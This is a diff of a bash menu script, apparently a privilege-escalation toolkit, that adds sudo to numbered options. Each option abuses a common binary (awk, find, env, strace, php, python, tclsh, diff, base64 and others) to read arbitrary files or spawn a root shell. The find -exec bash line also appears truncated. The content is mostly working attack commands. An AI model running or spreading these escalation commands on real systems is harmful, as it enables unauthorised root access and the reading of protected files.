@@ -940,7 +940,7 @@ while true; do
 		read -p "(example, ./secret.txt): " RFL
 		if [[ -f "$RFL" ]];
 		then
-			arp -v -f "$RFL"
+			sudo arp -v -f "$RFL"
 		fi
 	;;
 	"185")
@@ -948,7 +948,7 @@ while true; do
 		read -p "(example, ./secret.txt): " RFL
 		if [[ -f "$RFL" ]];
 		then
-			cut -d "" -f1 "$RFL"
+			sudo cut -d "" -f1 "$RFL"
 		fi
 	;;
 	"186")
@@ -956,7 +956,7 @@ while true; do
 		read -p "(example, ./secret.txt): " RFL
 		if [[ -f "$RFL" ]];
 		then
-			base64 "$RFL" | base64 --decode
+			sudo base64 "$RFL" | sudo base64 --decode
 		fi
 	;;
 	"187")
@@ -964,7 +964,7 @@ while true; do
 		read -p "(example, ./secret.txt): " RFL
 		if [[ -f "$RFL" ]];
 		then
-			tail "$RFL"
+			sudo tail "$RFL"
 		fi
 	;;
 	"188")
@@ -972,18 +972,18 @@ while true; do
 		read -p "(example, ./secret.txt): " RFL
 		if [[ -f "$RFL" ]];
 		then
-			ul "$RFL"
+			sudo ul "$RFL"
 		fi
 	;;
 	"189")
-		php5 -r "pcntl_exec('/bin/sh');"
+		sudo php5 -r "pcntl_exec('/bin/sh');"
 	;;
 	"190")
 		echo "Digit a file to read"
 		read -p "(example, ./secret.txt): " RFL
 		if [[ -f "$RFL" ]];
 		then
-			file -m "$RFL"
+			sudo file -m "$RFL"
 		fi
 	;;
 	"191")
@@ -992,31 +992,31 @@ while true; do
 		if [[ -f "$RFL" ]];
 		then
 			echo "digit exec cat ""$RFL"
-			tclsh8.5
+			sudo tclsh8.5
 		fi
 	;;
 	"192")
-		env /bin/sh
+		sudo env /bin/sh
 	;;
 	"193")
 		echo "Digit a file to read"
 		read -p "(example, ./secret.txt): " RFL
 		if [[ -f "$RFL" ]];
 		then
-			diff --line-format=%L /dev/null "$RFL"
+			sudo diff --line-format=%L /dev/null "$RFL"
 		fi
 	;;
 	"194")
-		strace -o /dev/null /bin/sh
+		sudo strace -o /dev/null /bin/sh
 	;;
 	"195")
-		awk 'BEGIN {system("/bin/bash")}'
+		sudo awk 'BEGIN {system("/bin/bash")}'
 	;;
 	"196")
 		sudo find / -exec bash -i \
 	;;
 	"197")
-		find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}'
+		sudo find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}'
 	;;
 	"198")
 		echo "After less command, digit 'v' and then digit 'shell'"
@@ -1052,7 +1052,7 @@ while true; do
 		read -p "(example, /usr/bin/python2.6): " PYT
 		if [[ -f "$PYT" ]];
 		then
-			$PYT -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'
+			sudo $PYT -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'
 		fi
 	;;
 	"206")
